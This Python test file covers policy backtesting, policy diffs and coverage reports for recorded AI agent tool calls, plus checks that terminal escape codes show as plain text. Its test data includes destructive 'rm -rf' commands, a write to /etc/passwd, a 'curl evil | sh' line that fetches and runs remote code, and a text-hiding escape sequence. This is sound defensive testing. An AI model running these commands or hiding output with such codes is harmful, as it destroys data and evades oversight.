"""Tests for historical policy backtesting (issue #211)."""

import argparse
import io
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from agent_trace.cli import _normalise_policy_argv, build_parser
from agent_trace.models import EventType, SessionMeta, TraceEvent
from agent_trace.policy_backtest import (
    PolicyBacktestError,
    backtest_policy,
    cmd_policy_backtest,
    cmd_policy_coverage,
    cmd_policy_diff,
    diff_policies,
    format_backtest,
    format_coverage,
    format_policy_diff,
    policy_coverage,
)
from agent_trace.store import TraceStore

try:
    import _escapes
except ImportError:
    from tests import _escapes


NOW = 2_000_000_000.0
DAY = 86400.0


def _tool(tool_name: str, **arguments) -> TraceEvent:
    return TraceEvent(
        event_type=EventType.TOOL_CALL,
        timestamp=NOW,
        data={"tool_name": tool_name, "arguments": arguments},
    )


class PolicyBacktestTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.store = TraceStore(Path(self.tmp.name) / "traces", redact=False)

    def tearDown(self):
        self.tmp.cleanup()

    def add_session(
        self,
        session_id: str,
        started_at: float,
        events: list[TraceEvent],
    ) -> None:
        meta = SessionMeta(session_id=session_id, started_at=started_at)
        self.store.create_session(meta)
        for event in events:
            event.session_id = session_id
            self.store.append_event(session_id, event)

    def write_policy(self, name: str, policy: dict) -> Path:
        path = Path(self.tmp.name) / name
        path.write_text(json.dumps(policy))
        return path


class TestPolicyBacktest(PolicyBacktestTestCase):
    def setUp(self):
        super().setUp()
        self.policy = self.write_policy("policy.json", {
            "files": {
                "read": {"allow": ["src/**"]},
                "write": {"deny": ["/etc/**"]},
            },
            "commands": {
                "allow": ["git *"],
                "deny": ["rm -rf *"],
            },
        })

    def test_backtest_filters_window_and_counts_each_rule(self):
        self.add_session("recent", NOW - 3600, [
            _tool("Read", file_path="src/main.py"),
            _tool("Write", file_path="/etc/hosts"),
            _tool("Bash", command="git status"),
            _tool("Bash", command="rm -rf build"),
            _tool("Read", file_path="README.md"),
            _tool("TodoWrite", todos=[]),
        ])
        self.add_session("too-old", NOW - 31 * DAY, [
            _tool("Write", file_path="/etc/passwd"),
        ])

        report = backtest_policy(self.store, self.policy, days=30, now=NOW)

        self.assertEqual(report.session_count, 1)
        self.assertEqual(report.total_tool_calls, 6)
        self.assertEqual(report.covered_tool_calls, 4)
        self.assertEqual(report.uncovered_tool_calls, 2)
        self.assertAlmostEqual(report.coverage_percent, 100 * 4 / 6)
        self.assertEqual(len(report.blocked_calls), 3)
        self.assertEqual(report.affected_session_ids, ["recent"])

        by_label = {stats.rule.label: stats for stats in report.rules}
        self.assertEqual(by_label["allow: read src/**"].matched, 1)
        self.assertEqual(by_label["allow: read src/**"].would_allow, 1)
        self.assertEqual(by_label["deny: write /etc/**"].would_block, 1)
        self.assertEqual(by_label["allow: bash git *"].would_allow, 1)
        self.assertEqual(by_label["deny: bash rm -rf *"].would_block, 1)

        # README.md is denied by the implicit allow-list default while the
        # arbitrary tool is allowed by default. Neither matched a pattern.
        default = by_label["default (no rule matched)"]
        self.assertEqual(default.matched, 2)
        self.assertEqual(default.would_block, 1)
        self.assertEqual(default.would_allow, 1)

    def test_all_history_includes_old_sessions(self):
        self.add_session("old", NOW - 90 * DAY, [
            _tool("Read", file_path="src/old.py"),
        ])
        report = backtest_policy(self.store, self.policy, days=None, now=NOW)
        self.assertEqual(report.session_count, 1)
        self.assertEqual(report.total_tool_calls, 1)
        self.assertIsNone(report.window_start)

    def test_zero_call_history_has_zero_coverage(self):
        self.add_session("empty", NOW - 60, [
            TraceEvent(event_type=EventType.USER_PROMPT, data={"prompt": "hello"}),
        ])
        report = backtest_policy(self.store, self.policy, now=NOW)
        self.assertEqual(report.total_tool_calls, 0)
        self.assertEqual(report.coverage_percent, 0.0)
        self.assertTrue(all(stats.matched == 0 for stats in report.rules))

    def test_missing_policy_and_invalid_window_are_errors(self):
        with self.assertRaises(PolicyBacktestError):
            backtest_policy(self.store, Path(self.tmp.name) / "missing.json", now=NOW)
        with self.assertRaisesRegex(PolicyBacktestError, "greater than zero"):
            backtest_policy(self.store, self.policy, days=0, now=NOW)

    def test_structurally_invalid_policy_fields_are_rejected(self):
        invalid_policies = [
            (["not", "an", "object"], "<root>"),
            ({"files": []}, "files"),
            ({"files": {"read": {"allow": "src/**"}}}, "files.read.allow"),
            ({"commands": {"deny": ["rm *", 7]}}, "commands.deny"),
            ({"network": {"deny_all": "false"}}, "network.deny_all"),
            ({"network": {"allow": "localhost"}}, "network.allow"),
        ]
        for index, (policy_data, field_name) in enumerate(invalid_policies):
            with self.subTest(field=field_name):
                path = self.write_policy(f"invalid-{index}.json", policy_data)
                with self.assertRaisesRegex(PolicyBacktestError, field_name.replace(".", r"\.")):
                    backtest_policy(self.store, path, now=NOW)

    def test_malformed_tool_arguments_are_uncovered_instead_of_aborting(self):
        event = TraceEvent(
            event_type=EventType.TOOL_CALL,
            timestamp=NOW,
            data={"tool_name": "Bash", "arguments": "rm -rf /tmp/build"},
        )
        self.add_session("malformed", NOW - 1, [event])

        report = backtest_policy(self.store, self.policy, now=NOW)

        self.assertEqual(report.total_tool_calls, 1)
        self.assertEqual(report.covered_tool_calls, 0)
        self.assertEqual(len(report.blocked_calls), 0)
        self.assertEqual(
            report.calls[0].reason,
            "malformed tool call arguments; no policy rule evaluated",
        )
        self.assertEqual(
            report.calls[0].action,
            "Tool: Bash (malformed arguments)",
        )
        default = next(stats for stats in report.rules if stats.rule.effect == "default")
        self.assertEqual(default.would_allow, 1)

    def test_backtest_json_is_machine_readable(self):
        self.add_session("recent", NOW - 1, [_tool("Read", file_path="src/a.py")])
        report = backtest_policy(self.store, self.policy, now=NOW)
        data = json.loads(json.dumps(report.to_dict()))
        self.assertEqual(data["type"], "policy_backtest")
        self.assertEqual(data["tool_calls"], 1)
        self.assertEqual(data["coverage"]["percent"], 100.0)
        self.assertIn("session_ids", data["would_block"])

    def test_show_sessions_lists_affected_ids(self):
        self.add_session("blocked-session", NOW - 1, [
            _tool("Write", file_path="/etc/hosts"),
        ])
        report = backtest_policy(self.store, self.policy, now=NOW)
        out = io.StringIO()
        format_backtest(report, out=out, show_sessions=True)
        text = out.getvalue()
        self.assertIn("Policy backtest", text)
        self.assertIn("Affected sessions", text)
        self.assertIn("blocked-session", text)


class TestNetworkBacktest(PolicyBacktestTestCase):
    def test_network_rules_are_attributed_once_per_call(self):
        policy = self.write_policy("network.json", {
            "network": {"deny_all": True, "allow": ["localhost"]},
        })
        self.add_session("network", NOW - 1, [
            _tool("Bash", command="curl http://localhost:8080/health"),
            _tool("Bash", command="curl https://example.com/data"),
            _tool("Bash", command="printf done"),
        ])

        report = backtest_policy(self.store, policy, now=NOW)

        self.assertEqual(report.total_tool_calls, 3)
        self.assertEqual(report.covered_tool_calls, 2)
        self.assertEqual(len(report.blocked_calls), 1)
        by_label = {stats.rule.label: stats for stats in report.rules}
        self.assertEqual(by_label["allow: network localhost"].would_allow, 1)
        self.assertEqual(by_label["deny: network *"].would_block, 1)
        self.assertEqual(by_label["default (no rule matched)"].would_allow, 1)


class TestPolicyDiff(PolicyBacktestTestCase):
    def test_diff_uses_one_snapshot_when_active_session_grows(self):
        self.add_session("active", NOW - 1, [
            _tool("Read", file_path="src/main.py"),
        ])
        old = self.write_policy("old.json", {})
        new = self.write_policy("new.json", {
            "files": {"write": {"deny": ["tmp/**"]}},
        })
        appended = _tool("Write", file_path="tmp/cache.txt")
        appended.session_id = "active"
        original_load_events = self.store.load_events
        load_count = 0

        def load_then_grow(session_id: str):
            nonlocal load_count
            events = original_load_events(session_id)
            load_count += 1
            if load_count == 1:
                self.store.append_event(session_id, appended)
            return events

        self.store.load_events = load_then_grow
        try:
            report = diff_policies(self.store, old, new, days=30, now=NOW)
        finally:
            self.store.load_events = original_load_events

        self.assertEqual(load_count, 1)
        self.assertEqual(report.old.total_tool_calls, 1)
        self.assertEqual(report.new.total_tool_calls, 1)
        self.assertEqual(report.introduced, [])

    def test_diff_finds_introduced_and_removed_blocks(self):
        self.add_session("writes", NOW - 1, [
            _tool("Write", file_path="tmp/cache.txt"),
        ])
        self.add_session("network", NOW - 2, [
            _tool("Bash", command="curl https://example.com/data"),
        ])
        old = self.write_policy("old.json", {
            "files": {"write": {"allow": ["**"]}},
            "commands": {"deny": ["curl *"]},
        })
        new = self.write_policy("new.json", {
            "files": {"write": {"deny": ["tmp/**"]}},
            "commands": {"allow": ["curl *"]},
        })

        report = diff_policies(self.store, old, new, days=30, now=NOW)

        self.assertEqual(len(report.old.blocked_calls), 1)
        self.assertEqual(len(report.new.blocked_calls), 1)
        self.assertEqual(report.blocked_delta, 0)
        self.assertEqual(len(report.introduced), 1)
        self.assertEqual(len(report.removed), 1)
        self.assertEqual(report.introduced[0].session_id, "writes")
        self.assertEqual(report.introduced[0].rule_label, "deny: write tmp/**")
        self.assertEqual(report.removed[0].session_id, "network")
        self.assertEqual(report.removed[0].rule_label, "deny: bash curl *")

        data = report.to_dict()
        self.assertEqual(data["new_blocks"]["tool_calls"], 1)
        self.assertEqual(data["blocks_removed"]["tool_calls"], 1)
        self.assertEqual(data["new_blocks"]["by_rule"][0]["tool_calls"], 1)

    def test_diff_format_recommends_reviewing_new_blocks(self):
        self.add_session("writes", NOW - 1, [
            _tool("Write", file_path="tmp/cache.txt"),
        ])
        old = self.write_policy("old.json", {})
        new = self.write_policy("new.json", {
            "files": {"write": {"deny": ["tmp/**"]}},
        })
        report = diff_policies(self.store, old, new, now=NOW)
        out = io.StringIO()
        format_policy_diff(report, out=out)
        text = out.getvalue()
        self.assertIn("New blocks introduced", text)
        self.assertIn("review 1 new blocks", text)


class TestPolicyCoverage(PolicyBacktestTestCase):
    def test_coverage_reports_and_lists_uncovered_calls(self):
        policy = self.write_policy("coverage.json", {
            "files": {"read": {"allow": ["src/**"]}},
        })
        self.add_session("coverage", NOW - 1, [
            _tool("Read", file_path="src/main.py"),
            _tool("Read", file_path="README.md"),
            _tool("Agent", prompt="delegate"),
        ])

        report = policy_coverage(self.store, policy, now=NOW)

        self.assertEqual(report.total_tool_calls, 3)
        self.assertEqual(report.covered_tool_calls, 1)
        self.assertEqual(report.uncovered_tool_calls, 2)
        self.assertAlmostEqual(report.coverage_percent, 100 / 3)
        data = report.to_dict(show_uncovered=True)
        self.assertEqual(len(data["uncovered_calls"]), 2)

        out = io.StringIO()
        format_coverage(report, out=out, show_uncovered=True)
        text = out.getvalue()
        self.assertIn("Coverage: 33.3%", text)
        self.assertIn("README.md", text)
        self.assertIn("Tool: Agent", text)


class TestPolicyBacktestCLI(unittest.TestCase):
    def test_parses_policy_subcommands(self):
        parser = build_parser()
        backtest = parser.parse_args([
            "policy", "backtest", "--policy", "scope.json", "--days", "14",
            "--show-sessions", "--format", "json",
        ])
        self.assertEqual(backtest.policy_command, "backtest")
        self.assertEqual(backtest.policy, "scope.json")
        self.assertEqual(backtest.days, 14)
        self.assertTrue(backtest.show_sessions)
        self.assertEqual(backtest.format, "json")

        diff = parser.parse_args(["policy", "diff", "old.json", "new.json"])
        self.assertEqual(diff.policy_command, "diff")
        self.assertEqual(diff.old_policy, "old.json")
        self.assertEqual(diff.new_policy, "new.json")

        coverage = parser.parse_args([
            "policy", "coverage", "--show-uncovered",
        ])
        self.assertEqual(coverage.policy_command, "coverage")
        self.assertTrue(coverage.show_uncovered)

    def test_legacy_policy_generation_is_normalised(self):
        self.assertEqual(
            _normalise_policy_argv(["policy", "abc123", "--dry-run"]),
            ["policy", "generate", "abc123", "--dry-run"],
        )
        self.assertEqual(
            _normalise_policy_argv(["--trace-dir", "traces", "policy"]),
            ["--trace-dir", "traces", "policy", "generate"],
        )
        self.assertEqual(
            _normalise_policy_argv(["policy", "backtest"]),
            ["policy", "backtest"],
        )


def _uncovered(event: TraceEvent) -> list[TraceEvent]:
    """Return the events of a session: one read that COVERAGE_POLICY covers, then *event*."""
    return [_tool("Read", file_path="src/main.py"), event]


COVERAGE_POLICY = {"files": {"read": {"allow": ["src/**"]}}}

# (label, kind, build): build(value) returns a policy with value in the
# pattern of the rule the label names. The kinds are in tests/_escapes.py.
BACKTEST_RULE_CASES = [
    ("read deny rule", "text", lambda v: {"files": {"read": {"deny": [v], "allow": ["src/**"]}}}),
    ("read allow rule", "text", lambda v: {"files": {"read": {"allow": ["src/**", v]}}}),
    ("write deny rule", "text", lambda v: {"files": {"write": {"deny": [v]}}}),
    ("write allow rule", "text", lambda v: {"files": {"write": {"allow": [v]}}}),
    ("bash deny rule", "text", lambda v: {"commands": {"deny": [v]}}),
    ("bash allow rule", "text", lambda v: {"commands": {"allow": [v]}}),
    ("network allow rule", "text", lambda v: {"network": {"deny_all": True, "allow": [v]}}),
]

# (label, kind, build): build(value) returns the old policy, the new policy
# and the events of a session. Value is the command and the pattern of the
# rule that blocks it.
DIFF_RULE_CASES = [
    ("new block", "text",
     lambda v: ({}, {"commands": {"deny": [v]}}, [_tool("Bash", command=v)])),
    ("removed block", "text",
     lambda v: ({"commands": {"deny": [v]}}, {}, [_tool("Bash", command=v)])),
]

# (label, kind, build): build(value) returns the events of a session with
# value in the uncovered call the label names.
COVERAGE_ACTION_CASES = [
    ("Read path", "text", lambda v: _uncovered(_tool("Read", file_path=v))),
    ("Glob pattern", "text", lambda v: _uncovered(_tool("Glob", pattern=v))),
    ("Grep path", "text", lambda v: _uncovered(_tool("Grep", path=v))),
    ("Write path", "text", lambda v: _uncovered(_tool("Write", file_path=v))),
    ("Bash command", "text", lambda v: _uncovered(_tool("Bash", command=v))),
    ("tool name", "text", lambda v: _uncovered(_tool(v))),
    ("tool name with malformed arguments", "text", lambda v: _uncovered(TraceEvent(
        event_type=EventType.TOOL_CALL,
        timestamp=NOW,
        data={"tool_name": v, "arguments": "not an object"},
    ))),
]

# (label, cut, build): the action keeps the first 80 characters of a command.
COVERAGE_CUTS = [
    ("Bash command", 80, lambda v: _uncovered(_tool("Bash", command=v))),
]


class TestPolicyReportsShowTraceTextAsText(unittest.TestCase):
    """policy backtest and policy diff print rule labels from policy files,
    which a repository can ship. policy coverage prints actions from traces,
    where the agent chose the commands and paths. Each can hold escape codes
    and line breaks, and the reports show them as text."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)

    def history(self, events: list[TraceEvent]) -> str:
        """Return the trace directory of a new store with one session, s1.

        Each render gets its own store, so a run with a payload and a run
        with plain text never share sessions. The session starts in the past,
        because the CLI handlers end the window at the current time.
        """
        trace_dir = tempfile.mkdtemp(dir=self.tmp.name)
        store = TraceStore(trace_dir, redact=False)
        store.create_session(SessionMeta(session_id="s1", started_at=1_700_000_000.0))
        for event in events:
            event.session_id = "s1"
            store.append_event("s1", event)
        return trace_dir

    def policy(self, policy: dict) -> str:
        with tempfile.NamedTemporaryFile(
            "w", dir=self.tmp.name, suffix=".json", delete=False,
        ) as f:
            json.dump(policy, f)
        return f.name

    def render_backtest(self, policy: dict) -> str:
        report = backtest_policy(
            TraceStore(self.history([_tool("Read", file_path="src/main.py")])),
            self.policy(policy),
            days=None,
        )
        out = io.StringIO()
        format_backtest(report, out=out, show_sessions=True)
        return out.getvalue()

    def render_diff(self, change: tuple[dict, dict, list[TraceEvent]]) -> str:
        old, new, events = change
        report = diff_policies(
            TraceStore(self.history(events)), self.policy(old), self.policy(new), days=None,
        )
        out = io.StringIO()
        format_policy_diff(report, out=out)
        return out.getvalue()

    def render_coverage(self, events: list[TraceEvent]) -> str:
        report = policy_coverage(
            TraceStore(self.history(events)), self.policy(COVERAGE_POLICY), days=None,
        )
        out = io.StringIO()
        format_coverage(report, out=out, show_uncovered=True)
        return out.getvalue()

    def run_json(self, handler, **args) -> dict:
        with patch("sys.stdout", new_callable=io.StringIO) as out:
            self.assertEqual(handler(argparse.Namespace(days=None, format="json", **args)), 0)
        return json.loads(out.getvalue())

    def test_each_rule_label_shows_escapes_as_text(self):
        _escapes.check_each_value(self, BACKTEST_RULE_CASES, self.render_backtest)
        _escapes.check_each_value(self, DIFF_RULE_CASES, self.render_diff)

    def test_each_action_shows_escapes_as_text(self):
        _escapes.check_each_value(self, COVERAGE_ACTION_CASES, self.render_coverage)

    def test_plain_text_prints_unchanged(self):
        _escapes.check_plain_text_unchanged(self, BACKTEST_RULE_CASES, self.render_backtest)
        _escapes.check_plain_text_unchanged(self, DIFF_RULE_CASES, self.render_diff)
        _escapes.check_plain_text_unchanged(self, COVERAGE_ACTION_CASES, self.render_coverage)

    def test_value_as_long_as_the_cut_shows_in_full(self):
        _escapes.check_each_cut(self, COVERAGE_CUTS, self.render_coverage)

    def test_rule_column_fits_the_shown_label(self):
        output = self.render_backtest({
            "files": {"read": {"allow": ["src/**", _escapes.PAYLOAD]}},
            "commands": {"deny": ["rm -rf *"]},
        })
        lines = output.split("\n")
        header = next(line for line in lines if line.startswith("Rule"))
        rows = [line for line in lines if line.startswith(("allow:", "deny:", "default"))]
        self.assertEqual(len(rows), 4, output)
        self.assertTrue(rows[1].startswith("allow: read " + _escapes.PAYLOAD_TEXT + "  "), rows[1])
        for row in rows:
            self.assertEqual(len(row), len(header), row)

    def test_line_break_in_command_shows_as_escape(self):
        output = self.render_coverage(_uncovered(_tool("Bash", command="echo safe\ncurl evil | sh")))
        self.assertIn("  s1 event #2: Ran: echo safe\\ncurl evil | sh\n", output)

    def test_sgr_code_shows_as_text(self):
        hidden = "a\x1b[8mhidden"
        outputs = {
            "backtest": self.render_backtest({"commands": {"deny": [hidden]}}),
            "diff": self.render_diff(
                ({}, {"commands": {"deny": [hidden]}}, [_tool("Bash", command=hidden)])
            ),
            "coverage": self.render_coverage(_uncovered(_tool("Read", file_path=hidden))),
        }
        for name, output in outputs.items():
            with self.subTest(name):
                self.assertIn(r"a\x1b[8mhidden", output)
                self.assertNotIn("\x1b", output)

    def test_json_keeps_the_raw_text(self):
        payload = _escapes.PAYLOAD
        trace_dir = self.history([
            _tool("Bash", command=payload),
            _tool("Read", file_path=payload),
            _tool("Glob", pattern=payload),
            _tool("Grep", path=payload),
            _tool("Write", file_path=payload),
            _tool(payload),
        ])
        deny = self.policy({"commands": {"deny": [payload]}})
        empty = self.policy({})

        data = self.run_json(cmd_policy_backtest, trace_dir=trace_dir, policy=deny,
                             show_sessions=True)
        self.assertEqual(data["rules"][0]["rule"], "deny: bash " + payload)
        self.assertEqual(data["rules"][0]["pattern"], payload)

        data = self.run_json(cmd_policy_diff, trace_dir=trace_dir, old_policy=empty,
                             new_policy=deny)
        self.assertEqual(data["new_blocks"]["by_rule"][0]["rule"], "deny: bash " + payload)
        self.assertEqual(data["new_blocks"]["calls"][0]["action"], "Ran: " + payload)

        data = self.run_json(cmd_policy_diff, trace_dir=trace_dir, old_policy=deny,
                             new_policy=empty)
        self.assertEqual(data["blocks_removed"]["by_rule"][0]["rule"], "deny: bash " + payload)
        self.assertEqual(data["blocks_removed"]["calls"][0]["action"], "Ran: " + payload)

        data = self.run_json(cmd_policy_coverage, trace_dir=trace_dir, policy=empty,
                             show_uncovered=True)
        self.assertEqual(
            [call["action"] for call in data["uncovered_calls"]],
            ["Ran: " + payload, "Read " + payload, "Glob " + payload, "Grep " + payload,
             "Write " + payload, "Tool: " + payload],
        )

        # A URL host ends at whitespace, so this host is the payload without it.
        host = payload.replace("\r", "").replace("\n", "")
        data = self.run_json(
            cmd_policy_diff,
            trace_dir=self.history([_tool("Bash", command=f"curl https://{host}/x")]),
            old_policy=empty,
            new_policy=self.policy({"network": {"deny_all": True}}),
        )
        self.assertEqual(data["new_blocks"]["calls"][0]["action"], "Network access " + host)


if __name__ == "__main__":
    unittest.main()
